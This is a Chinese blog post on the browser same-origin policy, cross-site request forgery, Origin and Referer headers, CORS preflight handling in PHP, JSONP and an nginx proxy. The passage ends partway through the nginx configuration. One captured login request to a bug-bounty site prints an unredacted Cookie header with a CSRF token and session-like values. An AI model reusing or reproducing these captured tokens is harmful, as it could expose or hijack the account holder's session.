    <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h5 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域?"></a>什么是跨域?</h5><p>域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界</p><p>只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。</p><p>网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。</p><h5 id="同源策略-1"><a href="#同源策略-1" class="headerlink" title="同源策略"></a>同源策略</h5><p>同源是指域名、协议、端口相同</p><p>浏览器的同源策略主要有两个:</p><p>DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现</p><p>XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求</p><p>存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问</p><h5 id="Dom-同源策略"><a href="#Dom-同源策略" class="headerlink" title="Dom 同源策略"></a>Dom 同源策略</h5><p>Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。</p><p>我们来看一个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现,他拒绝了支付宝页面的展示,原因是没有设置请求头---x-frame-options,主要原因就是不同源(sameorigin)/">www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin)</a></p><p><code>X-Frame-Options</code> 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY     &#x2F;&#x2F; 不允许iframe</span><br><span class="line">X-Frame-Options: SAMEORIGIN   &#x2F;&#x2F; 只允许同源的网站iframe</span><br><span class="line">X-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F)  &#x2F;&#x2F; 只允许指定网站iframe</span><br></pre></td></tr></table></figure><h5 id="XMLHttpRequest-同源策略"><a href="#XMLHttpRequest-同源策略" class="headerlink" title="XMLHttpRequest 同源策略"></a>XMLHttpRequest 同源策略</h5><p>XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造</p><p>跨站请求原理:</p><p>1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中</p><p>2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息</p><p>去执行一些非法操作</p><p>3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的</p><h5 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h5><h6 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h6><p>具体流程</p><ul><li>当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。</li></ul><p>请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。</p><h6 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h6><p>具体流程</p><ul><li>在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址</li><li>将该地址附加到referrer域中</li></ul><p>判断请求头中的Referer字段，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /pheapi/article/dir/<span class="number">89489609</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: blog.csdn.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json, text/javascript, */*; q=<span class="number">0.01</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://blog.csdn.net/qq_36119192/article/details/<span class="number">89489609</span></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">X-Tingyun-Id: im-pGljNfnc;r=<span class="number">901833252</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>以上场景出现在用户从<code>https://blog.csdn.net/qq_36119192/article/details/89489609</code>访问<code>/pheapi/article/dir/89489609</code>，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。</p><h6 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h6><p>origin只有发生跨域请求或者同域的post请求时候才会有。</p><p>referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。</p><p>补天平台登录请求头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1</span><br><span class="line">Host: user.butian.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=UTF<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">208</span></span><br><span class="line">//可以看到referer没有带上path和query</span><br><span class="line">Origin: https://user.butian.net</span><br><span class="line">Connection: close</span><br><span class="line">Referer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1</span><br><span class="line">Cookie: next=<span class="string">&quot;https%3A//www.butian.net/login.html&quot;</span>; __q__=<span class="number">1601903202954</span>; csrf_token=<span class="number">1601906836</span><span class="comment">##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27</span></span><br></pre></td></tr></table></figure><h5 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h5><h5 id="CORS-跨域解决"><a href="#CORS-跨域解决" class="headerlink" title="CORS 跨域解决"></a>CORS 跨域解决</h5><p>它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能同源使用的限制。</p><p>实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。</p><p>CORS的原理:</p><p>使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问</p><h5 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h5><h6 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h6><p>必须<code>同时满足</code>以下两个条件的请求，才是简单请求</p><p>请求方法只能是在以下三种之中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">POST</span><br><span class="line">HEAD</span><br></pre></td></tr></table></figure><p>HTTP的头信息不超出以下几种字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><h6 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>在发送真正请求之前，会先发送一次<code>预检</code>请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用<code>真实请求方法</code>发起请求</p><p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p><p>除了<code>Origin</code>字段，”预检”请求的头信息包括两个特殊字段。</p><ul><li><p>Access-Control-Request-Method</p><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p></li><li><p>Access-Control-Request-Headers</p><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p></li></ul><h5 id="三个与CORS请求相关的字段"><a href="#三个与CORS请求相关的字段" class="headerlink" title="三个与CORS请求相关的字段"></a>三个与CORS请求相关的字段</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><h6 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h6><p>该字段是必须的，它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p><h6 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h6><p>该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。</p><h6 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a>Access-Control-Expose-Headers</h6><p>该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><h6 id="简单请求-1"><a href="#简单请求-1" class="headerlink" title="简单请求"></a>简单请求</h6><p>两个网站—<a href="http://www.siam.com和www.siam2.com/">www.siam.com和www.siam2.com</a> sim向sim2发起请求 </p><p>sim网站如下,使用ajax请求sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是原始页面的内容<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sim2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>访问sim2的时候:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</span><br></pre></td></tr></table></figure><p>很明显不允许进行跨域</p><p>因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置:</p><p><strong>响应头中增加字段，来添加信任站点的域名</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">header</span>(&#x27;<span class="attr">Access-Control-Allow-Origin:http:</span>//<span class="attr">www.siam.com</span>&#x27;);</span></span><br><span class="line"><span class="tag"><span class="attr">echo</span> &quot;来自<span class="attr">index2.php</span>的内容&quot;;</span></span><br></pre></td></tr></table></figure><p>这里就跨域请求成功了。</p><h6 id="非简单请求-1"><a href="#非简单请求-1" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用<code>PUT</code>方法来测试就可以出现<code>非简单请求</code>的场景了。<br> 当然你也可以自定义HTTP头部来实现非简单请求。</p><p>我们把index.html的ajax方法改为<code>put</code> 然后请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : &quot;http://www.siam2.com/index2.php&quot;,</span><br><span class="line">    type: &quot;PUT&quot;,</span><br><span class="line">    success:function(res)&#123;</span><br><span class="line">        $(&#x27;body&#x27;).html(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到在请求中，我们填的是<code>PUT</code>，但是这里产生的却是<code>OPTIONS</code>，前面我们也说了，<code>非简单请求</code>会先产生一次<code>预检请求</code>，带上origin和真实的方法<code>在这里是PUT</code>，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法<code>PUT</code>发送一次请求。</p><p>我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。</p><p>我们在服务端的代码添加头部</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>); <span class="comment">// 需要同意两种类型，就用逗号隔开</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。</p><p>我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。</p><p>所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。</p><p>还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 如果不是同意的来源 就不用运行了</span></span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>], <span class="string">&#x27;http://www.siam.com&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line"><span class="comment">// 如果是预检请求，则通知信任即可，不需要执行脚本。</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;OPTIONS&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本</p><p>同时我们可以看一下，是否每一个<code>非简单请求</code>都需要先发送预检请求。我们在一个页面连续请求两次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">    type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">    success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">            type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现浏览器只有请求了3次：1次OPTIONS，2次PUT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一个页面中，预检操作只需要进行一次。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</span><br><span class="line">支持所有类型的 HTTP 请求。</span><br><span class="line">缺点</span><br><span class="line">第一次发送非简单请求时会多一次请求，增加服务器压力。</span><br></pre></td></tr></table></figure><h5 id="JSONP-跨域解决"><a href="#JSONP-跨域解决" class="headerlink" title="JSONP 跨域解决"></a>JSONP 跨域解决</h5><p>通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://steady.com/data.php?callback=steady&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params">jsondata</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//处理获得的json数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>首先我们在html中写下以下代码，创建一个script，调用动态脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Siam - script 同源解决&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;这是原始页面的内容&lt;/h1&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="comment">// 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).append(text);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;body&quot;</span>).append(<span class="string">&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\/script&gt;&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>服务端脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test(&#39;这是返回内容&#39;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>优点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。</span><br></pre></td></tr></table></figure><p>缺点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。</span><br></pre></td></tr></table></figure><h5 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h5><p>除了使用以上的两种方案，我们还可以在nginx配置反向代理，在<code>www.siam.com</code>下某个路径代理到<code>www.siam2.com</code>即可</p><p>我们打开nginx.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  www.siam.com;</span><br><span class="line">    <span class="comment">#charset koi8-r;</span></span><br><span class="line">    <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /apis &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://www.siam2.com;</span><br><span class="line">    